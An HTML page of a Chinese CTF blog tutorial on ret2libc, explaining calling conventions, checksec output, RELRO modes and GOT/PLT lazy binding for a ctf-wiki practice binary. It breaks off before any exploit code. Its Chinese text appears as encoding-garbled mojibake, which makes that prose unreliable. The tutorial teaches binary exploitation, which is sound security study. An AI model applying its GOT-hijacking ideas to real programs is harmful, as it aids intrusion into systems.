<!doctype html><html lang=zh-CN data-theme=light><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#222" media="(prefers-color-scheme: light)"><meta name=generator content="Hugo 0.146.0"><link rel="shortcut icon" type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/x-icon href=/imgs/icons/favicon.ico><link rel=icon type=image/png sizes=16x16 href=/imgs/icons/favicon_16x16_next.png><link rel=icon type=image/png sizes=32x32 href=/imgs/icons/favicon_32_32_next.png><link rel=apple-touch-icon sizes=180x180 href=/imgs/icons/apple_touch_icon_next.png><meta itemprop=name content="ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Ret2libc"><meta itemprop=description content="ä¸æƒ³å†™åšå®¢..."><meta name=description content="ä¸æƒ³å†™åšå®¢..."><meta itemprop=datePublished zgotmplz><meta itemprop=dateModified zgotmplz><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=keywords content="Ctf,Pwn"><meta property="og:type" content="article"><meta property="og:title" content="ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Ret2libc"><meta property="og:description" content="ä¸æƒ³å†™åšå®¢..."><meta property="og:image" content="/imgs/avatar.jpg"><meta property="og:image:width" content="312"><meta property="og:image:height" content="312"><meta property="og:image:type" content="image/jpeg/png/svg/jpg"><meta property="og:url" content="/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2libc/"><meta property="og:site_name" content="lhon901's blog"><meta property="og:locale" content="zh-CN"><meta property="article:author" content="lhon901"><meta property="article:published_time" content="2025-06-28 18:09:12 +0800 +0800"><meta property="article:modified_time" content="2025-06-28 18:09:12 +0800 +0800"><link type=text/css rel=stylesheet href=/js/3rd/font-awesome/6.7.2/css/all.min.css><link type=text/css rel=stylesheet href=/js/3rd/animate.css/3.1.1/animate.min.css><link type=text/css rel=stylesheet href=/js/3rd/viewerjs/1.11.6/viewer.min.css><link rel=stylesheet href="/css/main.min.css?=1752244419"><style type=text/css>.post-footer hr:after{content:"~ æˆ‘å¯æ˜¯æœ‰åº•çº¿çš„å“Ÿ ~"}.flinks-list-footer hr:after{content:"~ æˆ‘å¯æ˜¯æœ‰åº•çº¿çš„å“Ÿ ~"}</style><script type=text/javascript>(function(){localDB={set:function(e,t,n){if(n===0)return;const s=new Date,o=n*864e5,i={value:t,expiry:s.getTime()+o};localStorage.setItem(e,JSON.stringify(i))},get:function(e){const t=localStorage.getItem(e);if(!t)return void 0;const n=JSON.parse(t),s=new Date;return s.getTime()>n.expiry?(localStorage.removeItem(e),void 0):n.value}},theme={active:function(){const e=localDB.get("theme");if(e==null)return;theme.toggle(e),window.matchMedia("(prefers-color-scheme: dark)").addListener(function(e){theme.toggle(e.matches?"dark":"light")})},toggle:function(e){document.documentElement.setAttribute("data-theme",e),localDB.set("theme",e,2);const t=document.querySelector("iframe.giscus-frame");if(t){const n={setConfig:{theme:e}};t.contentWindow.postMessage({giscus:n},"https://giscus.app")}}},theme.active()})(window)</script><script type=text/javascript>document.addEventListener("DOMContentLoaded",()=>{var e=document.createElement("script");e.charset="UTF-8",e.src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js",e.async=!1,e.defer=!0,document.head.appendChild(e),e.onload=function(){NexT.utils.fmtBusuanzi()}})</script><title>ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Ret2libc - lhon901's blog</title><noscript><link rel=stylesheet href=/css/noscript.css></noscript></head><body itemscope itemtype=http://schema.org/WebPage class=use-motion><div class=headband></div><main class=main><header class=header itemscope itemtype=http://schema.org/WPHeader><div class=header-inner><div class=site-brand-container><div class=site-nav-toggle><div class=toggle aria-label role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div></div><div class=site-meta><a href=/ class=brand rel=start><i class=logo-line></i><h1 class=site-title>lhon901's blog</h1><i class=logo-line></i></a><p class=site-subtitle itemprop=description></p></div><div class=site-nav-right><div class="toggle popup-trigger"><i class="fa fa-search fa-fw fa-lg"></i></div></div></div><nav class=site-nav><ul class="main-menu menu"><li class="menu-item menu-item-home"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-home hvr-icon"></i>é¦–é¡µ</a></li><li class="menu-item menu-item-about"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-user hvr-icon"></i>å…³äº</a></li><li class="menu-item menu-item-flinks"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-thumbs-up hvr-icon"></i>å‹æƒ…é“¾æ¥</a></li><li class="menu-item menu-item-example"><a href=/ class="menus-parent hvr-icon-pulse" rel=section><i class="fa fa-angles-down hvr-icon"></i>è¯­æ³•ç¤ºä¾‹
<span class=menu-item-shrink-icon><i class="fa fa-angle-right"></i></span></a><ul class=menu-children><li class=menu-child-item><a href=/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>è¯­æ³•é«˜äº®</a></li><li class=menu-child-item><a href=/ class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>æ•°å­¦å…¬å¼</a></li><li class=menu-child-item><a href=/post/11-mermaid-charts class=hvr-icon-pulse rel=section><i class="fa hvr-icon"></i>æµç¨‹å›¾</a></li></ul></li><li class="menu-item menu-item-archives"><a href=/ class=hvr-icon-pulse rel=section><i class="fa fa-archive hvr-icon"></i>å½’æ¡£
<span class=badge>14</span></a></li><li class="menu-item menu-item-commonweal"><a href=/404.html class=hvr-icon-pulse rel=section><i class="fa fa-heartbeat hvr-icon"></i>å…¬ç›Š 404</a></li><li class="menu-item menu-item-search"><a role=button class="popup-trigger hvr-icon-pulse"><i class="fa fa-search fa-fw hvr-icon"></i>æœç´¢</a></li></ul></nav><div class=search-pop-overlay><div class="popup search-popup"><div class=search-header><span class=search-icon><i class="fa fa-search"></i></span><div class=search-input-container><input autocomplete=off autocapitalize=off maxlength=80 placeholder=æœç´¢... spellcheck=false type=search class=search-input></div><span class=popup-btn-close role=button><i class="fa fa-times-circle"></i></span></div><div class="search-result-container no-result"><div class=search-result-icon><i class="fa fa-spinner fa-pulse fa-5x"></i></div></div></div></div></div><div class="toggle sidebar-toggle" role=button><span class=toggle-line></span>
<span class=toggle-line></span>
<span class=toggle-line></span></div><aside class=sidebar><div class="sidebar-inner sidebar-nav-active sidebar-toc-active"><ul class=sidebar-nav><li class=sidebar-nav-toc>æ–‡ç« ç›®å½•</li><li class=sidebar-nav-overview>ç«™ç‚¹æ¦‚è§ˆ</li></ul><div class=sidebar-panel-container><div class="post-toc-wrap sidebar-panel"><div class="post-toc animated"><nav id=TableOfContents><ul><li><a href=#å‰è¨€>å‰è¨€</a></li><li><a href=#å‡½æ•°è°ƒç”¨çº¦å®šå’Œå‡½æ•°ä¼ å‚>å‡½æ•°è°ƒç”¨çº¦å®šå’Œå‡½æ•°ä¼ å‚</a></li><li><a href=#å»¶è¿Ÿç»‘å®š>å»¶è¿Ÿç»‘å®š</a></li><li><a href=#ret2libc>ret2libc</a><ul><li><a href=#ret2libc1>ret2libc1</a></li><li><a href=#ret2libc2>ret2libc2</a></li><li><a href=#ret2libc3>ret2libc3</a></li></ul></li></ul></nav></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author site-overview-item animated" itemprop=author itemscope itemtype=http://schema.org/Person><img class=site-author-image itemprop=image alt=lhon901 src=/imgs/img-lazy-loading.gif data-src=/imgs/avatar.jpg><p class=site-author-name itemprop=name>lhon901</p><div class=site-description itemprop=description>ä¸æƒ³å†™åšå®¢...</div></div><div class="site-state-wrap site-overview-item animated"><nav class=site-state><div class="site-state-item site-state-posts"><a href=/archives/><span class=site-state-item-count>14</span>
<span class=site-state-item-name>æ—¥å¿—</span></a></div><div class="site-state-item site-state-categories"><a href=/categories/><span class=site-state-item-count>2</span>
<span class=site-state-item-name>åˆ†ç±»</span></a></div><div class="site-state-item site-state-tags"><a href=/tags/><span class=site-state-item-count>3</span>
<span class=site-state-item-name>æ ‡ç­¾</span></a></div></nav></div><div class="links-of-social site-overview-item animated"><span class=links-of-social-item><a href=https://github.com/craftopc title="Github â†’ https://github.com/craftopc" rel=noopener class=hvr-icon-pulse target=_blank><i class="fab fa-github fa-fw hvr-icon"></i>
Github
</a></span><span class=links-of-social-item><a href=mailto:lhon901@163.com title="E-Mail â†’ mailto:lhon901@163.com" rel=noopener class=hvr-icon-pulse target=_blank><i class="fa fa-envelope fa-fw hvr-icon"></i>
E-Mail</a></span></div><div class="cc-license animated" itemprop=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans class=cc-opacity rel=noopener target=_blank title=å…±äº«çŸ¥è¯†><img src=/imgs/img-lazy-loading.gif data-src=/imgs/cc/big/by_nc_sa.svg alt=å…±äº«çŸ¥è¯†></a></div><div class="links-of-blogroll site-overview-item animated"><div class=links-of-blogroll-title><i class="fa fa-globe fa-fw"></i>
å‹æƒ…é“¾æ¥</div><ul class=links-of-blogroll-list><li class=links-of-blogroll-item><a href=https://gitee.com/hugo-next/hugo-theme-next title=https://gitee.com/hugo-next/hugo-theme-next target=_blank>Hugo-NexT</a></li><li class=links-of-blogroll-item><a href=https://lisenhui.cn title=https://lisenhui.cn target=_blank>å‡¡æ¢¦æ˜Ÿå°˜ç©ºé—´ç«™</a></li></ul></div></div></div></div><div id=siteinfo-card-widget class=sidebar-card-widget><div class=item-headline><i class="fas fa-chart-line"></i>
<span>ç½‘ç«™èµ„è®¯</span></div><div class=siteinfo><div class=siteinfo-item><div class=item-name><i class="fa-solid fa-calendar-check"></i>å·²è¿è¡Œï¼š</div><div class=item-count id=runTimes data-publishdate="2025-04-14 20:18:58 +0800 +0800"></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-user"></i>æ€»è®¿å®¢æ•°ï¼š</div><div class=item-count id=busuanzi_value_site_uv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fas fa fa-eye"></i>é¡µé¢æµè§ˆï¼š</div><div class=item-count id=busuanzi_value_site_pv><i class="fa fa-sync fa-spin"></i></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-font"></i>æ€»å­—æ•°ï¼š</div><div class=item-count id=wordsCount data-count=37971></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-mug-hot"></i>é˜…è¯»çº¦ï¼š</div><div class=item-count id=readTimes data-times=81></div></div><div class=siteinfo-item><div class=item-name><i class="fa fa-clock-rotate-left"></i>æœ€åæ›´æ–°äºï¼š</div><div class=item-count id=last-push-date data-lastpushdate="2025-07-11 22:32:51 +0800 +0800"></div></div></div></div></aside><div class=sidebar-dimmer></div></header><div class=tool-buttons><div id=goto-i18n-translate class=button title=å¤šè¯­è¨€ç¿»è¯‘><i class="fas fa-globe"></i></div><div id=toggle-theme class=button title=æ·±æµ…æ¨¡å¼åˆ‡æ¢><i class="fas fa-adjust"></i></div><div class=back-to-top role=button title=è¿”å›é¡¶éƒ¨><i class="fa fa-arrow-up"></i>
<span>0%</span></div></div><div class=reading-progress-bar></div><a role=button class="book-mark-link book-mark-link-fixed"></a><a href=https://github.com/hugo-next rel="noopener external nofollow noreferrer" target=_blank title="Follow me on GitHub" class="exturl github-corner"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0 0 115 115h15l12 27L250 250V0z"/><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentcolor" style="transform-origin:130px 106px" class="octo-arm"/><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4l13.9-13.8C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8z" fill="currentcolor" class="octo-body"/></svg>
</a><script type=text/javascript src=//sidecar.gitter.im/dist/sidecar.v1.js async></script><script type=text/javascript>((window.gitter={}).chat={}).options={room:"hugo-next/community"}</script><noscript><div class=noscript-warning>Theme NexT works best with JavaScript enabled</div></noscript><div class="main-inner post posts-expand"><div class=post-block><article itemscope itemtype=http://schema.org/Article class=post-content lang><link itemprop=mainEntityOfPage href=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2libc/><span hidden itemprop=author itemscope itemtype=http://schema.org/Person><meta itemprop=image content="/imgs/avatar.jpg"><meta itemprop=name content="lhon901"></span><span hidden itemprop=publisher itemscope itemtype=http://schema.org/Organization><meta itemprop=name content="lhon901"><meta itemprop=description content="ä¸æƒ³å†™åšå®¢..."></span><span hidden itemprop=post itemscope itemtype=http://schema.org/CreativeWork><meta itemprop=name content="ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Ret2libc"><meta itemprop=description content="å‰è¨€

ret2libc å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ libc ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)
å‡½æ•°è°ƒç”¨çº¦å®šå’Œå‡½æ•°ä¼ å‚

å½“ä½¿ç”¨ ida pro é€†å‘åˆ†ææ—¶ï¼Œå‡½æ•°å¼€å¤´æ€»æœ‰è¿™ä¹ˆä¸€æ®µï¼š"></span><header class=post-header><h1 class=post-title itemprop="name headline">ä»é›¶å¼€å§‹çš„ Pwn ä¹‹æ—… - Ret2libc
<a href=https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name/posts/%e4%bb%8e%e9%9b%b6%e5%bc%80%e5%a7%8b%e7%9a%84%20Pwn%20%e4%b9%8b%e6%97%85%20-%20ret2libc.md rel="noopener external nofollow noreferrer" target=_blank class="exturl post-edit-link" title=ç¼–è¾‘><i class="fa fa-pen-nib"></i></a></h1><div class=post-meta-container><div class=post-meta-items><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-calendar"></i>
</span><span class=post-meta-item-text title=å‘è¡¨äº>å‘è¡¨äºï¼š
</span><time title="åˆ›å»ºæ—¶é—´ï¼š2025-06-28 18:09:12 +08:00" itemprop="dateCreated datePublished" datetime="2025-06-28 18:09:12 +0800 +0800">2025-06-28
</time></span><span class=post-meta-item><span class=post-meta-item-icon><i class="fas fa-solid fa-folder-open"></i>
</span><span class=post-meta-item-text title=åˆ†ç±»äº>åˆ†ç±»äºï¼š
</span><span itemprop=about itemscope itemtype=http://schema.org/Thing><a href=/categories/ctf/ itemprop=url rel=index><span itemprop=name>Ctf</span></a></span></span></div><div class=post-meta-items><span class=post-meta-item title=å­—æ•°><span class=post-meta-item-icon><i class="fas fa-solid fa-file-word"></i>
</span><span class=post-meta-item-text>å­—æ•°ï¼š</span>
<span>3772</span>
</span><span class=post-meta-item title=é˜…è¯»><span class=post-meta-item-icon><i class="fas fa-solid fa-clock"></i>
</span><span class=post-meta-item-text>é˜…è¯»ï¼š&ap;</span>
<span>8åˆ†é’Ÿ</span>
</span><span class=post-meta-item title=æµè§ˆ><span class=post-meta-item-icon><i class="fas fa-solid fa-eye"></i>
</span><span class=post-meta-item-text>æµè§ˆï¼š
</span><span id=busuanzi_value_page_pv data-path=/posts/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84-pwn-%E4%B9%8B%E6%97%85---ret2libc/><i class="fa fa-sync fa-spin"></i></span></span></div></div></header><div class="post-body autonumber" itemprop=articleBody><h2 id=å‰è¨€>å‰è¨€
<a class=header-anchor href=#%e5%89%8d%e8%a8%80></a></h2><p>ret2libc å³æ§åˆ¶å‡½æ•°çš„æ‰§è¡Œ libc ä¸­çš„å‡½æ•°ï¼Œé€šå¸¸æ˜¯è¿”å›è‡³æŸä¸ªå‡½æ•°çš„ plt å¤„æˆ–è€…å‡½æ•°çš„å…·ä½“ä½ç½® (å³å‡½æ•°å¯¹åº”çš„ got è¡¨é¡¹çš„å†…å®¹)</p><h2 id=å‡½æ•°è°ƒç”¨çº¦å®šå’Œå‡½æ•°ä¼ å‚>å‡½æ•°è°ƒç”¨çº¦å®šå’Œå‡½æ•°ä¼ å‚
<a class=header-anchor href=#%e5%87%bd%e6%95%b0%e8%b0%83%e7%94%a8%e7%ba%a6%e5%ae%9a%e5%92%8c%e5%87%bd%e6%95%b0%e4%bc%a0%e5%8f%82></a></h2><p>å½“ä½¿ç”¨ ida pro é€†å‘åˆ†ææ—¶ï¼Œå‡½æ•°å¼€å¤´æ€»æœ‰è¿™ä¹ˆä¸€æ®µï¼š</p><a id=more></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-0-1><a class=lnlinks href=#hl-0-1>1</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p><code>__fastcall</code> æ˜¯å‡½æ•°è°ƒç”¨çº¦å®šçš„ä¸€ç§ï¼Œè¡¨ç¤ºå‡½æ•°å‚æ•°é€šè¿‡å¯„å­˜å™¨ä¼ é€’è€Œä¸æ˜¯é€šè¿‡æ ˆã€‚å…·ä½“æ¥è¯´ï¼Œå‰ä¸‰ä¸ªå‚æ•°é€šè¿‡ <code>rdi</code> å’Œ <code>rsi</code> å’Œ <code>rdx</code> å¯„å­˜å™¨ä¼ é€’, å‰å…­ä¸ªå‚æ•°é€šè¿‡å¯„å­˜å™¨ä¼ é€’ï¼Œåé¢çš„å‚æ•°é€šè¿‡æ ˆä¼ é€’ã€‚</p><p>32 ä½ç¨‹åºé€šè¿‡æ ˆä¼ å‚</p><h2 id=å»¶è¿Ÿç»‘å®š>å»¶è¿Ÿç»‘å®š
<a class=header-anchor href=#%e5%bb%b6%e8%bf%9f%e7%bb%91%e5%ae%9a></a></h2><blockquote><p>ç›¸å…³è°ƒè¯•ç”¨åˆ°çš„ç¨‹åº
<a href=https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1 title=ret2libc1 rel="noopener external nofollow noreferrer" target=_blank class=exturl>ret2libc1
<i class="fa fa-external-link-alt"></i></a></p></blockquote><p>å½“ä½¿ç”¨ <code>pwn checksec</code> æ£€æµ‹äºŒè¿›åˆ¶æ–‡ä»¶æ—¶</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-1-1><a class=lnlinks href=#hl-1-1>1</a>
</span><span class=lnt id=hl-1-2><a class=lnlinks href=#hl-1-2>2</a>
</span><span class=lnt id=hl-1-3><a class=lnlinks href=#hl-1-3>3</a>
</span><span class=lnt id=hl-1-4><a class=lnlinks href=#hl-1-4>4</a>
</span><span class=lnt id=hl-1-5><a class=lnlinks href=#hl-1-5>5</a>
</span><span class=lnt id=hl-1-6><a class=lnlinks href=#hl-1-6>6</a>
</span><span class=lnt id=hl-1-7><a class=lnlinks href=#hl-1-7>7</a>
</span><span class=lnt id=hl-1-8><a class=lnlinks href=#hl-1-8>8</a>
</span><span class=lnt id=hl-1-9><a class=lnlinks href=#hl-1-9>9</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwn checksec ./ret2libc1        <span class=o>(</span>.venv<span class=o>)</span> âœ˜ <span class=m>130</span> master âœ± â—¼
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/home/lhon901/Pwn/ctf-challenges/pwn/linux/user-mode/stackoverflow/ret2libc/ret2libc1/ret2libc1&#39;</span>
</span></span><span class=line><span class=cl>    Arch:       i386-32-little
</span></span><span class=line><span class=cl>    RELRO:      Partial RELRO
</span></span><span class=line><span class=cl>    Stack:      No canary found
</span></span><span class=line><span class=cl>    NX:         NX enabled
</span></span><span class=line><span class=cl>    PIE:        No PIE <span class=o>(</span>0x8048000<span class=o>)</span>
</span></span><span class=line><span class=cl>    Stripped:   No
</span></span><span class=line><span class=cl>    Debuginfo:  Yes</span></span></code></pre></td></tr></table></div></div><ul><li><code>RELRO: Partial RELRO</code> è¡¨ç¤ºå¯ç”¨äº†å»¶è¿Ÿç»‘å®š (Lazy Binding)ï¼Œå³å‡½æ•°çš„åœ°å€åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶æ‰ä¼šè¢«è§£æå¹¶å¡«å…¥ GOT è¡¨ä¸­ã€‚</li><li><code>RELRO: Full RELRO</code> è¡¨ç¤ºå¯ç”¨äº†å…¨å±€é‡å®šä½ (Full RELRO)ï¼Œå³å‡½æ•°çš„åœ°å€åœ¨ç¨‹åºåŠ è½½æ—¶å°±ä¼šè¢«è§£æå¹¶å¡«å…¥ GOT è¡¨ä¸­ã€‚</li><li><code>RELRO: No RELRO</code> è¡¨ç¤ºæ²¡æœ‰å¯ç”¨å»¶è¿Ÿç»‘å®šã€‚</li></ul><p>åœ¨ç¬¬ä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬æ›¾ç»è®¨è®ºäº†åŠ¨æ€é“¾æ¥å’Œé™æ€é“¾æ¥ã€‚åŠ¨æ€é“¾æ¥ä¸ºäº†èŠ‚çœå‚¨å­˜ç©ºé—´é‡‡ç”¨è¿è¡Œæ—¶è£…è½½ libc åº“</p><p>ç¨‹åºä¸­ .got æ®µè®°å½•äº† libc åº“ä¸­å‡½æ•°çš„åœ°å€ï¼Œå¦‚æœæ”»å‡»è€…ä¿®æ”¹äº† got åœ°å€ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ§åˆ¶ç¨‹åºæµäº†ã€‚ä¸ºæ­¤ï¼Œrelro é˜²æŠ¤æœºåˆ¶åº”è¿è€Œç”Ÿã€‚</p><p>ä½†æ˜¯å› ä¸ºè®¡ç®—æœºåº•å±‚çš„é™åˆ¶ï¼ŒRELRO æœºåˆ¶æ²¦ä¸º ğŸ¤¡ æœºåˆ¶</p><ul><li><code>RELRO: No RELRO</code>ï¼šæ²¡æœ‰å¯ç”¨ä»»ä½•é˜²æŠ¤ï¼Œæ”»å‡»è€…å¯ä»¥ç›´æ¥ä¿®æ”¹ GOT è¡¨ã€‚</li><li><code>RELRO: Partial RELRO</code>ï¼šå¯ç”¨äº†éƒ¨åˆ†é˜²æŠ¤ï¼Œå½“æ‰€æœ‰ç¬¦å·è¢«è§£æå®Œå…¨ï¼Œ.got è¡¨å°±ä¼šè¢«é”å®šï¼Œæ”»å‡»è€…æ— æ³•å†ä¿®æ”¹ã€‚ä½†æ˜¯ç¨‹åºçš„ç¬¦å·ä¸€èˆ¬ä¸ä¼šè¢«è§£æå®Œå…¨ï¼Œæ¯”å¦‚é€€å‡ºç¨‹åºéœ€è¦ <code>exit</code> å‡½æ•° (ç¼–è¯‘å™¨é»˜è®¤å¼€å¯ <code>RELRO: Partial RELRO</code>)
å› ä¸ºè®¡ç®—æœºå†…å­˜ç®¡ç†çš„æœ€å°å•ä½æ˜¯é¡µ (4K), è¿™å°±å¯¼è‡´äº†æ— æ³•é’ˆå¯¹æ²¡ä¸€è¡¨é¡¹ä¿®æ”¹æƒé™ï¼Œåªèƒ½ä¿®æ”¹æ•´ä¸ª .got æ®µçš„æƒé™</li><li><code>RELRO: Full RELRO</code>ï¼šå¯ç”¨äº†å®Œå…¨é˜²æŠ¤ï¼Œæ‰€æœ‰ç¬¦å·åœ¨ç¨‹åºåŠ è½½æ—¶å°±ä¼šè¢«è§£æå¹¶å¡«å…¥ GOT è¡¨ï¼Œæ”»å‡»è€…æ— æ³•å†ä¿®æ”¹ã€‚ä½†æ˜¯ä¼šä¸€å®šå¹…åº¦ä¸Šé™ä½ç¨‹åºçš„è¿è¡Œé€Ÿåº¦</li></ul><p><code>Partial RELRO</code> ä¸‹ç¨‹åºå»¶è¿Ÿç»‘å®šçš„è¿‡ç¨‹ï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-2-1><a class=lnlinks href=#hl-2-1> 1</a>
</span><span class=lnt id=hl-2-2><a class=lnlinks href=#hl-2-2> 2</a>
</span><span class=lnt id=hl-2-3><a class=lnlinks href=#hl-2-3> 3</a>
</span><span class=lnt id=hl-2-4><a class=lnlinks href=#hl-2-4> 4</a>
</span><span class=lnt id=hl-2-5><a class=lnlinks href=#hl-2-5> 5</a>
</span><span class=lnt id=hl-2-6><a class=lnlinks href=#hl-2-6> 6</a>
</span><span class=lnt id=hl-2-7><a class=lnlinks href=#hl-2-7> 7</a>
</span><span class=lnt id=hl-2-8><a class=lnlinks href=#hl-2-8> 8</a>
</span><span class=lnt id=hl-2-9><a class=lnlinks href=#hl-2-9> 9</a>
</span><span class=lnt id=hl-2-10><a class=lnlinks href=#hl-2-10>10</a>
</span><span class=lnt id=hl-2-11><a class=lnlinks href=#hl-2-11>11</a>
</span><span class=lnt id=hl-2-12><a class=lnlinks href=#hl-2-12>12</a>
</span><span class=lnt id=hl-2-13><a class=lnlinks href=#hl-2-13>13</a>
</span><span class=lnt id=hl-2-14><a class=lnlinks href=#hl-2-14>14</a>
</span><span class=lnt id=hl-2-15><a class=lnlinks href=#hl-2-15>15</a>
</span><span class=lnt id=hl-2-16><a class=lnlinks href=#hl-2-16>16</a>
</span><span class=lnt id=hl-2-17><a class=lnlinks href=#hl-2-17>17</a>
</span><span class=lnt id=hl-2-18><a class=lnlinks href=#hl-2-18>18</a>
</span><span class=lnt id=hl-2-19><a class=lnlinks href=#hl-2-19>19</a>
</span><span class=lnt id=hl-2-20><a class=lnlinks href=#hl-2-20>20</a>
</span><span class=lnt id=hl-2-21><a class=lnlinks href=#hl-2-21>21</a>
</span><span class=lnt id=hl-2-22><a class=lnlinks href=#hl-2-22>22</a>
</span><span class=lnt id=hl-2-23><a class=lnlinks href=#hl-2-23>23</a>
</span><span class=lnt id=hl-2-24><a class=lnlinks href=#hl-2-24>24</a>
</span><span class=lnt id=hl-2-25><a class=lnlinks href=#hl-2-25>25</a>
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>             +----------------------+
</span></span><span class=line><span class=cl>             |         ELF          |
</span></span><span class=line><span class=cl>             +----------------------+
</span></span><span class=line><span class=cl>                       |
</span></span><span class=line><span class=cl>                       v
</span></span><span class=line><span class=cl>             +----------------------+
</span></span><span class=line><span class=cl>             | .got.plt (GOTè¡¨)     |
</span></span><span class=line><span class=cl>             +----------------------+
</span></span><span class=line><span class=cl>             |   foo@got -&gt; plt[0]  |------+
</span></span><span class=line><span class=cl>             +----------------------+\     |
</span></span><span class=line><span class=cl>                       |                (é¦–æ¬¡è°ƒç”¨)
</span></span><span class=line><span class=cl>                       v                   |
</span></span><span class=line><span class=cl>             +----------------------+   +--v-------------------+
</span></span><span class=line><span class=cl>             |        PLT           |   | åŠ¨æ€é“¾æ¥å™¨ (ld.so)   |
</span></span><span class=line><span class=cl>             +----------------------+   +----------------------+
</span></span><span class=line><span class=cl>             |  foo@plt: jmp [foo@got] |         |
</span></span><span class=line><span class=cl>             +----------------------+   |   é‡å®šä½ foo@got     |
</span></span><span class=line><span class=cl>                                        +---+------------------+
</span></span><span class=line><span class=cl>                                            |
</span></span><span class=line><span class=cl>                                            v
</span></span><span class=line><span class=cl>             +----------------------------+
</span></span><span class=line><span class=cl>             | foo@got = foo@libc address |
</span></span><span class=line><span class=cl>             +----------------------------+
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>åç»­å†æ¬¡è°ƒç”¨ foo@plt æ—¶ï¼Œç›´æ¥è·³è½¬åˆ° foo@libcï¼Œå®ç°å»¶è¿Ÿç»‘å®šã€‚</span></span></code></pre></td></tr></table></div></div><p>åœ¨ ida pro ä¸­è¿›è¡Œå®ä¾‹åˆ†æï¼š</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt id=hl-3-1><a class=lnlinks href=#hl-3-1>  1</a>
</span><span class=lnt id=hl-3-2><a class=lnlinks href=#hl-3-2>  2</a>
</span><span class=lnt id=hl-3-3><a class=lnlinks href=#hl-3-3>  3</a>
</span><span class=lnt id=hl-3-4><a class=lnlinks href=#hl-3-4>  4</a>
</span><span class=lnt id=hl-3-5><a class=lnlinks href=#hl-3-5>  5</a>
</span><span class=lnt id=hl-3-6><a class=lnlinks href=#hl-3-6>  6</a>
</span><span class=lnt id=hl-3-7><a class=lnlinks href=#hl-3-7>  7</a>
</span><span class=lnt id=hl-3-8><a class=lnlinks href=#hl-3-8>  8</a>
</span><span class=lnt id=hl-3-9><a class=lnlinks href=#hl-3-9>  9</a>
